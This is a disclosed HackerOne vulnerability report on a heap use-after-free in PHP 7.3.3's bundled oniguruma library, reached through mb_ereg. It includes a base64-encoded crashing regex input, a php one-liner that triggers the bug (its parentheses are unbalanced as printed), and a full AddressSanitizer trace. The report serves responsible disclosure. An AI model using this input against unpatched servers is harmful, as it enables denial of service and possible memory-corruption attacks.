# PHP 7.3.3: Heap-use-after-free (READ of size 8) in match_at()

## Report Details
- **Report ID**: 692040
- **URL**: https://hackerone.com/reports/692040
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-10T20:52:59.091Z
- **Disclosed**: 2020-10-12T12:14:36.632Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Bug Report: https://bugs.php.net/bug.php?id=77721 

PHP 7.3.3 was vulnerable to a Use After Free flaw thanks to 3rd party code known as oniguruma. This bug was fixed by upgrading the PHP bundled oniguruma from 6.9.0 to 6.9.1. 

This particular bug wasn't assigned a CVE for whatever reason. However a there were recently some similar CVE assignments mentioned [here](https://thehackernews.com/2019/09/php-programming-language.html) but I doubt they are related. 

```
echo "KCg/KAApMCspKysrKCgoMFxnPDA+KTApfCgpKSsrKysoKD8oMSkoMFxnPDA+KSkrKysrKyswKigp
KSsrKysoKD8oMSkoMFxnPDE+KSspKysrKysrKysrKyooKSkrKysrKCg/KDEpKCgwKVxnPDA+KSsp
KysoKSkrMCsrKisrKygoKDBcZzwwPikpKigpKSsrKysoKD8oMSkoMFxnPDA+KSspKysrKysrKysr
Kyp8KSsrKysqKysrKCg/KDEpKCgwKVxnPDA+KSspKysrKysrKysrKCkpKysqfCkrKysrKCg/KAAp
MCkpfA==" | base64 -d | tee test0011
```
```
php -r '$file=file_get_contents("test0011"); print_r(mb_ereg($file, 0);'
```

```
==7000==ERROR: AddressSanitizer: heap-use-after-free on address 0x11805420b8d8 at pc 0x7ff805b0c066 bp 0x001a2e9fae80 sp 0x001a2e9faec8
READ of size 8 at 0x11805420b8d8 thread T0
    #0 0x7ff805b0c065 in onig_match_with_param+0x12e55 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18072c065)
    #1 0x7ff805b111e3 in onig_search_with_param+0x1193 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1807311e3)
    #2 0x7ff805b5c494 in onig_unicode_define_user_property+0x5c54 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18077c494)
    #3 0x7ff805620667 in zend_execute+0x13bcd7 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180240667)
    #4 0x7ff8054e47f9 in execute_ex+0xf9 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1801047f9)
    #5 0x7ff8054e4d4c in zend_execute+0x3bc (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180104d4c)
    #6 0x7ff8053e937e in zend_execute_scripts+0x1be (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18000937e)
    #7 0x7ff805807755 in php_execute_script+0x845 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180427755)
    #8 0x7ff76687407b in sapi_cli_single_write+0x306b (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x14000407b)
    #9 0x7ff766871ae3 in sapi_cli_single_write+0xad3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140001ae3)
    #10 0x7ff766890ad3 in sapi_cli_single_write+0x1fac3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140020ad3)
    #11 0x7ff84b6c7973 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017973)
    #12 0x7ff84d72a270 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x18006a270)

0x11805420b8d8 is located 10200 bytes inside of 10672-byte region [0x118054209100,0x11805420bab0)
freed by thread T0 here:
    #0 0x7ff804a847d5 in _asan_memmove+0x5d5 (C:\Program Files\LLVM\lib\clang\8.0.0\lib\windows\clang_rt.asan_dynamic-x86_64.dll+0x1800347d5)
    #1 0x7ff805b19a27 in onig_setup_builtin_monitors_by_ascii_encoded_name+0x1947 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180739a27)
    #2 0x7ff805b01b40 in onig_match_with_param+0x8930 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180721b40)
    #3 0x7ff805b111e3 in onig_search_with_param+0x1193 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1807311e3)
    #4 0x7ff805b5c494 in onig_unicode_define_user_property+0x5c54 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18077c494)
    #5 0x7ff805620667 in zend_execute+0x13bcd7 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180240667)
    #6 0x7ff8054e47f9 in execute_ex+0xf9 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1801047f9)
    #7 0x7ff8054e4d4c in zend_execute+0x3bc (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180104d4c)
    #8 0x7ff8053e937e in zend_execute_scripts+0x1be (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18000937e)
    #9 0x7ff805807755 in php_execute_script+0x845 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180427755)
    #10 0x7ff76687407b in sapi_cli_single_write+0x306b (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x14000407b)
    #11 0x7ff766871ae3 in sapi_cli_single_write+0xad3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140001ae3)
    #12 0x7ff766890ad3 in sapi_cli_single_write+0x1fac3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140020ad3)
    #13 0x7ff84b6c7973 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017973)
    #14 0x7ff84d72a270 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x18006a270)

previously allocated by thread T0 here:
    #0 0x7ff804a847d5 in _asan_memmove+0x5d5 (C:\Program Files\LLVM\lib\clang\8.0.0\lib\windows\clang_rt.asan_dynamic-x86_64.dll+0x1800347d5)
    #1 0x7ff805b19a27 in onig_setup_builtin_monitors_by_ascii_encoded_name+0x1947 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180739a27)
    #2 0x7ff805afb96e in onig_match_with_param+0x275e (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18071b96e)
    #3 0x7ff805b111e3 in onig_search_with_param+0x1193 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1807311e3)
    #4 0x7ff805b5c494 in onig_unicode_define_user_property+0x5c54 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18077c494)
    #5 0x7ff805620667 in zend_execute+0x13bcd7 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180240667)
    #6 0x7ff8054e47f9 in execute_ex+0xf9 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x1801047f9)
    #7 0x7ff8054e4d4c in zend_execute+0x3bc (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180104d4c)
    #8 0x7ff8053e937e in zend_execute_scripts+0x1be (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18000937e)
    #9 0x7ff805807755 in php_execute_script+0x845 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x180427755)
    #10 0x7ff76687407b in sapi_cli_single_write+0x306b (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x14000407b)
    #11 0x7ff766871ae3 in sapi_cli_single_write+0xad3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140001ae3)
    #12 0x7ff766890ad3 in sapi_cli_single_write+0x1fac3 (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php.exe+0x140020ad3)
    #13 0x7ff84b6c7973 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017973)
    #14 0x7ff84d72a270 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x18006a270)

SUMMARY: AddressSanitizer: heap-use-after-free (D:\php-sdk\phpdev\vc15\x64\php-src-7.3\x64\Release\php7.dll+0x18072c065) in onig_match_with_param+0x12e55
```

## Impact

Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.

## Attachments
No attachments
